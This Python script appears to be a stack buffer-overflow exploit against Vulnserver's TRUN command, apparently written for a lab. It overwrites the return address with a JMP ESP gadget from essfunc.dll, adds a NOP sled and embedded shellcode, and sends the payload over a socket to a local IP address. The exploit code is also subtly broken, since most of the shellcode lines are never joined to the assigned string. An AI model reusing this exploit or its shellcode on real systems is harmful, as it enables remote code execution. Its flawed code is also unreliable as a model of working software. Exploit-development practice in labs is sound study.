#!/usr/bin/python
 
import sys, socket
from time import sleep

# msf-masm_shell
# nasm > JMP ESP
# 00000000  FFE4              jmp esp 
# !mona find -s "\xFF\xE4" -m essfunc.dll
# 0x625011af
# 0x625011bb

# use b at front to byte encode
overflow = "\xd9\xee\xd9\x74\x24\xf4\xba\xe1\x97\xb6\xbc\x5e\x31\xc9\xb1"
"\x52\x31\x56\x17\x03\x56\x17\x83\x0f\x6b\x54\x49\x33\x7c\x1b"
"\xb2\xcb\x7d\x7c\x3a\x2e\x4c\xbc\x58\x3b\xff\x0c\x2a\x69\x0c"
"\xe6\x7e\x99\x87\x8a\x56\xae\x20\x20\x81\x81\xb1\x19\xf1\x80"
"\x31\x60\x26\x62\x0b\xab\x3b\x63\x4c\xd6\xb6\x31\x05\x9c\x65"
"\xa5\x22\xe8\xb5\x4e\x78\xfc\xbd\xb3\xc9\xff\xec\x62\x41\xa6"
"\x2e\x85\x86\xd2\x66\x9d\xcb\xdf\x31\x16\x3f\xab\xc3\xfe\x71"
"\x54\x6f\x3f\xbe\xa7\x71\x78\x79\x58\x04\x70\x79\xe5\x1f\x47"
"\x03\x31\x95\x53\xa3\xb2\x0d\xbf\x55\x16\xcb\x34\x59\xd3\x9f"
"\x12\x7e\xe2\x4c\x29\x7a\x6f\x73\xfd\x0a\x2b\x50\xd9\x57\xef"
"\xf9\x78\x32\x5e\x05\x9a\x9d\x3f\xa3\xd1\x30\x2b\xde\xb8\x5c"
"\x98\xd3\x42\x9d\xb6\x64\x31\xaf\x19\xdf\xdd\x83\xd2\xf9\x1a"
"\xe3\xc8\xbe\xb4\x1a\xf3\xbe\x9d\xd8\xa7\xee\xb5\xc9\xc7\x64"
"\x45\xf5\x1d\x2a\x15\x59\xce\x8b\xc5\x19\xbe\x63\x0f\x96\xe1"
"\x94\x30\x7c\x8a\x3f\xcb\x17\x75\x17\xb6\xea\x1d\x6a\x38\xd6"
"\xf4\xe3\xde\x72\x17\xa2\x49\xeb\x8e\xef\x01\x8a\x4f\x3a\x6c"
"\x8c\xc4\xc9\x91\x43\x2d\xa7\x81\x34\xdd\xf2\xfb\x93\xe2\x28"
"\x93\x78\x70\xb7\x63\xf6\x69\x60\x34\x5f\x5f\x79\xd0\x4d\xc6"
"\xd3\xc6\x8f\x9e\x1c\x42\x54\x63\xa2\x4b\x19\xdf\x80\x5b\xe7"
"\xe0\x8c\x0f\xb7\xb6\x5a\xf9\x71\x61\x2d\x53\x28\xde\xe7\x33"
"\xad\x2c\x38\x45\xb2\x78\xce\xa9\x03\xd5\x97\xd6\xac\xb1\x1f"
"\xaf\xd0\x21\xdf\x7a\x51\x41\x02\xae\xac\xea\x9b\x3b\x0d\x77"
"\x1c\x96\x52\x8e\x9f\x12\x2b\x75\xbf\x57\x2e\x31\x07\x84\x42"
"\x2a\xe2\xaa\xf1\x4b\x27"




buffer = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

try:
    payload = "TRUN /.:/" + buffer
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.101.14',9999))
    print ("[+] Sending the payload...\n" + str(len(buffer)))
    s.send((payload.encode()))
    s.close()
    sleep(1)

except:
    print ("Error in connection")
    sys.exit()
